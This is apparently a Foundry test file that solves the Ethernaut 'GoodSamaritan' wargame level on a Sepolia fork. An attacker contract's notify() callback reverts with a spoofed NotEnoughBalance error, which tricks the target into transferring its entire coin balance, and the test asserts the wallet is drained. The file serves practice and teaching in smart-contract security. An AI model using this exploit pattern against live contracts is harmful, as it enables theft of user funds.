// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {GoodSamaritan, INotifyable, Wallet, Coin} from "../src/ethernaut/GoodSamaritan.sol";

contract AttackGoodSamaritan is INotifyable {
    error NotEnoughBalance();

    function requestDonation(address _good) external {
        GoodSamaritan(_good).requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanAttacker is Test {
    address constant goodSamaritan = 0x3DB7052a06e6f00c7c1F9f1868704f9D31518583;
    uint256 constant blockNumber = 6359731;
    address constant alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;
    Wallet wallet;
    Coin coin;

    function setUp() external {
        vm.selectFork(
            vm.createFork(vm.envString("SEPOLIA_RPC_URL"), blockNumber)
        );
        wallet = GoodSamaritan(goodSamaritan).wallet();
        coin = GoodSamaritan(goodSamaritan).coin();
    }

    function testAttack() public {
        console.log("Attack Before:");
        console.log("wallet balance:", coin.balances(address(wallet)));
        _attack();
        console.log("Attack After:");
        console.log("wallet balance:", coin.balances(address(wallet)));

        assertEq(coin.balances(address(wallet)), 0);
    }

    function _attack() internal {
        vm.startPrank(alice, alice);

        AttackGoodSamaritan attack = new AttackGoodSamaritan();
        attack.requestDonation(goodSamaritan);

        vm.stopPrank();
    }
}

// forge test --match-contract GoodSamaritanAttacker -vvv
